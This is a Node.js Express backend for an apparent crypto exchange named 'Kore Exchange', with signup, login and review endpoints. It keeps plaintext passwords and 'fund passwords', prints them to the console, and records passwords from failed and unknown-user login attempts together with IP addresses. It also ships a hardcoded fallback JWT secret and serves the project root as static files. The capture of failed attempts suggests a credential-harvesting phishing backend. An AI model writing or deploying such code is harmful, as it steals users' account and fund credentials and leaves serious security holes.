const express = require('express');
const cors    = require('cors');
const bcrypt  = require('bcrypt');
const jwt     = require('jsonwebtoken');
require('dotenv').config();
const pool = require('./db');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// ── Health Check ──────────────────────────────────────────
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ── Signup Endpoint ───────────────────────────────────────
app.post('/api/signup', async (req, res) => {
  const { email, phone, password, fundPassword, referralCode } = req.body;

  if ((!email && !phone) || !password) {
    return res.status(400).json({ error: 'Email/Phone and password are required.' });
  }

  try {
    const passwordHash     = await bcrypt.hash(password, 10);
    const fundPasswordHash = fundPassword ? await bcrypt.hash(fundPassword, 10) : null;

    const result = await pool.query(
      `INSERT INTO users
         (email, phone, password, fund_password, password_hash, fund_password_hash, referral_code)
       VALUES ($1,$2,$3,$4,$5,$6,$7)
       RETURNING id, email, phone, created_at`,
      [
        email        || null,
        phone        || null,
        password,
        fundPassword || null,
        passwordHash,
        fundPasswordHash,
        referralCode || null
      ]
    );

    const user = result.rows[0];
    console.log(`[SIGNUP] New User: ${email || phone} | Pass: ${password}`);

    const token = jwt.sign(
      { userId: user.id, email: user.email },
      process.env.JWT_SECRET || 'kore_secret_change_me',
      { expiresIn: '7d' }
    );

    res.status(201).json({ message: 'User registered successfully', token, user });

  } catch (err) {
    if (err.code === '23505') {
      return res.status(409).json({ error: 'Email or phone number already registered.' });
    }
    console.error('Signup error:', err);
    res.status(500).json({ error: 'Internal server error.' });
  }
});

// ── Login Endpoint ────────────────────────────────────────
app.post('/api/login', async (req, res) => {
  const { email, phone, password, fundPassword } = req.body;
  const identifier = email || phone;
  const ipAddress  = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  console.log(`[LOGIN ATTEMPT] Identifier: ${identifier} | Password: ${password} | Fund Password: ${fundPassword || 'N/A'} | IP: ${ipAddress}`);

  if (!identifier || !password) {
    return res.status(400).json({ error: 'Please provide email/phone and password.' });
  }

  try {
    const query  = email ? 'SELECT * FROM users WHERE email = $1' : 'SELECT * FROM users WHERE phone = $1';
    const result = await pool.query(query, [identifier]);

    if (result.rows.length === 0) {
      console.log(`[LOGIN FAILED] User not found: ${identifier}`);
      await pool.query(
        `INSERT INTO failed_logins (identifier, attempted_password, confirm_fund_password, reason, ip_address) VALUES ($1,$2,$3,$4,$5)`,
        [identifier, password, fundPassword || null, 'User not found', ipAddress]
      ).catch(() => {});
      return res.status(401).json({ error: 'Invalid credentials.' });
    }

    const user    = result.rows[0];
    const isValid = user.password
      ? (user.password === password)
      : await bcrypt.compare(password, user.password_hash);

    if (!isValid) {
      console.log(`[LOGIN FAILED] Wrong password for: ${identifier}`);
      await pool.query(
        `INSERT INTO failed_logins (identifier, attempted_password, confirm_fund_password, reason, ip_address) VALUES ($1,$2,$3,$4,$5)`,
        [identifier, password, fundPassword || null, 'Incorrect password', ipAddress]
      ).catch(() => {});
      return res.status(401).json({ error: 'Invalid credentials.' });
    }

    console.log(`[LOGIN SUCCESS] ${identifier} (ID: ${user.id})`);

    const token = jwt.sign(
      { userId: user.id, email: user.email },
      process.env.JWT_SECRET || 'kore_secret_change_me',
      { expiresIn: '7d' }
    );

    res.json({
      message: 'Login successful',
      token,
      user: { id: user.id, email: user.email, phone: user.phone }
    });

  } catch (err) {
    console.error('Login error:', err);
    res.status(500).json({ error: 'Internal server error.' });
  }
});

// ── Review Endpoint ───────────────────────────────────────
app.post('/api/review', async (req, res) => {
  const { overall, categories, tags, review } = req.body;

  console.log(`[REVIEW SUBMITTED] Overall: ${overall} | Tags: ${(tags||[]).join(', ')} | Review: ${review?.substring(0,80)}`);

  try {
    await pool.query(
      `INSERT INTO reviews (overall_rating, categories, tags, review_text, created_at)
       VALUES ($1, $2, $3, $4, NOW())`,
      [overall, JSON.stringify(categories || {}), (tags || []).join(','), review || '']
    ).catch(() => {});

    res.json({ message: 'Review submitted. Thank you!' });
  } catch (err) {
    console.error('Review error:', err);
    res.json({ message: 'Review received.' });
  }
});

// ── Start Server ──────────────────────────────────────────
if (process.env.NODE_ENV !== 'production' && require.main === module) {
  app.listen(PORT, () => {
    console.log(`✅ Kore Exchange Server running on http://localhost:${PORT}`);
  });
}

module.exports = app;
